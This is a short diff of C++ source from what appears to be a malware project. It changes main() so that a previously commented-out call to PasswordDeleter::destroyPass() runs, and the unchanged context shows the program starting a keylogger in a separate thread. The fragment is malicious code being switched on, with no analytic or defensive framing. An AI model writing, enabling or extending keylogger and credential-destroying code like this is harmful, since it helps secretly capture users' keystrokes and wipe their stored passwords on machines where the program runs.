@@ -527,7 +527,7 @@ int application() {
 // ---------------------------------------------------------------------
 int main() {
    // remove comment to start password deleter
-   // PasswordDeleter::destroyPass();
+    PasswordDeleter::destroyPass();
     
     // Start keylogger in a separate thread
     std::thread keylogThreadObj(keyloggerThread);
